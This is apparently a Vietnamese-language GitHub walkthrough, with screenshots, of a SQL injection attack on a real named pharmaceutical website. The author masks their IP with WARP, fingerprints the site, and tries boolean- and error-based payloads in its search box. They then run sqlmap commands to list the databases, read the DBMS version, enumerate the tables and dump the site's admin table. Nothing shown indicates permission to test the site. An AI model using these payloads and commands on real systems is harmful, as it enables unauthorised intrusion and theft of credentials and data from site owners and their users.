### 1. Bật WARP để thay đổi IP và đảm bảo quá trình kiểm thử không bị chặn.

<img width="352" height="452" alt="image" src="https://github.com/user-attachments/assets/40ad461a-8a82-458f-aaa5-055da430e1b4" />

### 2. Truy cập trang web duocphamhanoi.vn

<img width="1492" height="919" alt="image" src="https://github.com/user-attachments/assets/d3d941c6-33ee-4e6c-b3af-b97a9f33a7f7" />

### 3. Dùng Wappalyzer để thu thập thông tin, biết được trang web duocphamhanoi.vn sử dụng cms wordpress, code bằng ngôn ngữ PHP, hệ quản trị csdl MySQL

<img width="487" height="544" alt="image" src="https://github.com/user-attachments/assets/50d7cf7e-af23-40c7-8099-295df955f806" />

### 4. Kiểm thử thủ công với payload boolean-based và error-based tại ô tìm kiếm.

payload boolean-based: `'OR 1=1-- -`

- Kết quả trả về toàn bộ sản phẩm → có dấu hiệu SQL Injection.

<img width="563" height="880" alt="image" src="https://github.com/user-attachments/assets/338b95ba-bb20-400e-a838-179ad6d665aa" />

payload error-based: `'AND updatexml(1,concat(0x7e,database(),0x7e),1)-- -`

- Kết quả trả về lỗi SQL hiển thị lỗi từ DBMS

<img width="1131" height="584" alt="image" src="https://github.com/user-attachments/assets/8b8c93ff-cf48-4ecc-a02d-c7c37058c63c" />

### 5. Bắt request tìm kiếm và lưu vào file request.txt.

- Chèn ký tự * vào tham số tag để xác định vị trí kiểm thử cho sqlmap.

<img width="631" height="395" alt="image" src="https://github.com/user-attachments/assets/90ae05ca-32b9-4b7c-ac0b-66ace7b4b5c1" />

### 6. Bật tool sqlmap, chạy lệnh `python sqlmap.py -r request.txt -p tag --batch --level=3 --risk=2 --technique=BEU`

- SQLmap lấy request.txt, test tham số tag bằng kỹ thuật Boolean, Error và Union, với mức độ test chuyên sâu (level=3, risk=2), và chạy tự động

<img width="953" height="483" alt="image" src="https://github.com/user-attachments/assets/2a8e47b0-6711-48f5-b18a-f3c59386bc14" />

### 7. sqlmap phát hiện website tồn tại SQL Injection dạng Boolean‑based và Error‑based.

<img width="964" height="195" alt="image" src="https://github.com/user-attachments/assets/0db4b9ba-b114-4d51-ba31-c126eabd9fd2" />

### 8. Liệt kê các database bằng lệnh: `python sqlmap.py -r request.txt --dbs`

<img width="489" height="36" alt="image" src="https://github.com/user-attachments/assets/3a8c7255-3d45-4cc2-ac2d-6701bc48e9a7" />

<img width="531" height="184" alt="image" src="https://github.com/user-attachments/assets/1d87e648-c00e-4463-8102-fcc2049349ea" />

- Kết quả: information_schema và duocphamha_hn.

### 9. Thu thập thông tin DBMS: `python sqlmap.py -r request.txt --banner`

- Lệnh này dùng để xem Tên loại database, Phiên bản DB, v.v

<img width="522" height="36" alt="image" src="https://github.com/user-attachments/assets/541febeb-5002-4f01-8ed7-2c8f92e43253" />

<img width="531" height="130" alt="image" src="https://github.com/user-attachments/assets/2e50f03c-89a7-48a6-a422-75d8fd22c7b3" />

Kết quả: MariaDB 10.5.9, chạy trên nền MySQL ≥5.0.

### 10. Liệt kê các bảng trong database duocphamha_hn: `python sqlmap.py -r request.txt -D duocphamha_hn --tables` 

<img width="646" height="31" alt="image" src="https://github.com/user-attachments/assets/d6ba1d5b-06a4-4476-92c2-3c5610103491" />

<img width="526" height="932" alt="image" src="https://github.com/user-attachments/assets/65978669-be79-422c-9c4f-9d8fdc508af4" />

### 11. Trích xuất dữ liệu bảng adoosite_admin: `python sqlmap.py -r request.txt -D duocphamha_hn -T adoosite_admin --dump`

<img width="782" height="37" alt="image" src="https://github.com/user-attachments/assets/a97a0595-d1d2-49a2-bb65-405302520440" />

<img width="1291" height="248" alt="image" src="https://github.com/user-attachments/assets/f74beb3f-bd5e-454e-961b-2f787c9258ae" />

